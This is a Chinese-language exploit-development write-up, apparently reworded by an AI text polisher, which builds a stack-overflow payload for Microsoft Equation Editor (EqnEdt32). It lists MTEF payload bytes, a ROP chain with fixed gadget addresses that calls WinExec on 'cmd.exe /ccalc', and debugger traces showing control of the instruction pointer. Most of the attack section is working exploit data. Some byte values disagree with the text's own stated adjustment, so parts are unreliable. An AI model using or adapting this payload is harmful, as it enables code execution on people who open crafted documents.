以下是优化后的文本，使其更加清晰、连贯和专业：

---

根据从checkpoint截图中提取的数据，我构造了如下的数据结构（图18）：

**图18**
```
03 01 01 03 0A  // MTEF头部
0A             // 初始SIZE
09             // tag
64             // 0n100
22             // lsize
1c             // dsize-high-byte
4c             // dsize-low-byte
44             // 确保进入case 4
66             // 填充用，随意
77             // 填充用，随意
09             // 填充用，随意
05             // 填充用，随意
AA             // 填充用，随意
55             // 确保进入第2个case 4
10             // sub_443e34内读入的第1个字节
11             // sub_443e34内读入的第2个字节
12             // sub_443e34内读入的第3个字节
1c             // 等待计算以决定拷贝大小的长度1
4c             // 等待计算以决定拷贝大小的长度2
63 6d 64 2e 65 78 65 20  // 第一次拷贝的8个字节
2f 63 63 61 6c 63 00 44 44 44 44 44 ef be ad de ef be ad de  // 第二次拷贝的20个字节
```

通过图3可以看出，checkpoint提供的两个长度分别为8个字节和20个字节。第一次调用`sub_443F6c`会覆盖从`v6`（含）到`v8`（不含）的0x8个字节，第二次调用则会覆盖从`vac_C`（含）到`ret_addr`（含）的0x14个字节，从而成功覆盖返回地址并获取控制流。

此时，寄存器状态如下：
```
eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
eip=00443efc esp=0012f480 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
EqnEdt32!MFEnumFunc+0x156ff:
00443efc c3              ret
```

执行`t`指令后，寄存器状态变为：
```
eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
eip=deadbeef esp=0012f484 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
deadbeef ??              ???
```

检查`eax`指向的内存区域：
```
0:000> db eax
001f15f2  30 4f 45 00 7a 16 1f 00-00 00 00 00 00 00 00 00  0OE.z...........
001f1602  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001f1612  00 00 00 00 00 00 00 00-96 fe 00 00 44 0b aa 14  ............D...
001f1622  1f 00 63 6d 64 2e 65 78-65 20 2f 63 63 61 6c 63  ..cmd.exe /ccalc
001f1632  00 44 44 44 44 44 e4 14-1f 00 10 01 3a 00 20 5a  .DDDDD......:. Z
001f1642  45 00 7a 16 1f 00 00 00-00 00 00 00 00 00 00 00  E.z.............
001f1652  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001f1662  00 00 00 00 00 00 00 00-00 00 44 00 00 00 00 00  ..........D.....
```

与checkpoint文章中的描述一致，此时`eax`指向命令行参数的前0x32个字节处。不出所料，`eip`被覆盖为`0xdeadbeef`，这与checkpoint文章中的情况相符。

接下来，我们需要使用ROP技术来确保栈溢出后的布局。checkpoint的文章已经提供了生成ROP链的方法。在未启用ASLR的`eqnedt32`版本上，基址固定为`0x400000`。根据溢出长度，第一次拷贝长度为8个字节，第二次拷贝长度为40个字节，因此需要将控制长度的字节从`1c 4c`调整为`1c 9c`（因为`(2 * 0x9c + 9) >> 3 = 0x28`）。

最终，在不打11月补丁的版本上，我构造的数据如下：
```
03 01 01 03 0A  // MTEF头部
0A             // 初始SIZE
09             // tag
64             // 0n100
22             // lsize
1c             // dsize-high-byte
4c             // dsize-low-byte
44             // 确保进入case 4
66             // 填充用，随意
77             // 填充用，随意
09             // 填充用，随意
05             // 填充用，随意
AA             // 填充用，随意
55             // 确保进入第2个case 4
10             // sub_443e34内读入的第1个字节
11             // sub_443e34内读入的第2个字节
12             // sub_443e34内读入的第3个字节
1c             // 等待计算以决定拷贝大小的长度1
4c             // 等待计算以决定拷贝大小的长度2
63 6d 64 2e 65 78 65 20  // 第一次拷贝的8个字节
2f 63 63 61 6c 63 00 44 44 44 44 44
19 00 00 00  // ebp
3a c7 44 00  // ret_addr: add esp, 4; ret
28 5b 45 00  // a read_write addr
b6 0e 41 00  // add eax, ebp; ret 2
b6 0e 41 00  // add eax, ebp; ret 2
00 00        // pad for adjust stack by 2 bytes
4b ed 40 00  // push eax; call sub_30C00(which call WinExec)
00 00        // pad for align by 4 bytes
00 00 00 00  // 保证执行流顺利到达ret(这里加了4个00，加1个即可)
```

调试运行时发现公式编辑器直接退出了。仔细排查后发现是`sub_437c9d`函数中调用`sub_43a78f`导致的（图19），可能是case语句没有取到合适的值，导致虚函数调用失败，从而导致进程退出。

**图19**

由于这两个函数我已经分析过（图8和图17），所以这里直接让下一个字节等于0即可，这样就会直接break，不会继续解析tag。

最终，在不打11月补丁的版本上，我构造的全部数据如下：
```
03 01 01 03 0A  // MTEF头部
0A             // 初始SIZE
09             // tag
64             // 0n100
22             // lsize
1c             // dsize-high-byte
4c             // dsize-low-byte
44             // 确保进入case 4
66             // 填充用，随意
77             // 填充用，随意
09             // 填充用，随意
05             // 填充用，随意
AA             // 填充用，随意
55             // 确保进入第2个case 4
10             // sub_443e34内读入的第1个字节
11             // sub_443e34内读入的第2个字节
12             // sub_443e34内读入的第3个字节
1c             // 等待计算以决定拷贝大小的长度1
4c             // 等待计算以决定拷贝大小的长度2
63 6d 64 2e 65 78 65 20  // 第一次拷贝的8个字节
2f 63 63 61 6c 63 00 44 44 44 44 44
19 00 00 00  // ebp
3a c7 44 00  // ret_addr: add esp, 4; ret
28 5b 45 00  // a read_write addr
b6 0e 41 00  // add eax, ebp; ret 2
b6 0e 41 00  // add eax, ebp; ret 2
00 00        // pad for adjust stack by 2 bytes
4b ed 40 00  // push eax; call sub_30C00(which call WinExec)
00 00        // pad for align by 4 bytes
00 00 00 00  // 保证执行流顺利到达ret(这里加了4个00，加1个即可)
```

调试运行时设置断点并单步执行：
```
0:000> bp 443e34
0:000> g
...
Sat Jan 13 21:14:17.616 2018 (GMT+8): Breakpoint 0 hit
eax=00454f30 ebx=00000006 ecx=0012f4ac edx=00000002 esi=0012f7e4 edi=0012f5e0
eip=00443e34 esp=0012f480 ebp=0012f4b4 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
EqnEdt32!MFEnumFunc+0x15637:
00443e34 55              push    ebp
...
0:000> g
Sat Jan 13 21:14:30.970 2018 (GMT+8): Breakpoint 1 hit
eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
eip=00443efc esp=0012f480 ebp=00000019 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
EqnEdt32!MFEnumFunc+0x156ff:
00443efc c3              ret
0:000> t
eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
eip=0044c73a esp=0012f484 ebp=00000019 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
EqnEdt32!FltToolbarWinProc+0x25d3:
0044c73a 83c404          add     esp,4
0:000> t
```

---

希望这些改进能帮助你更好地理解并传达你的意图。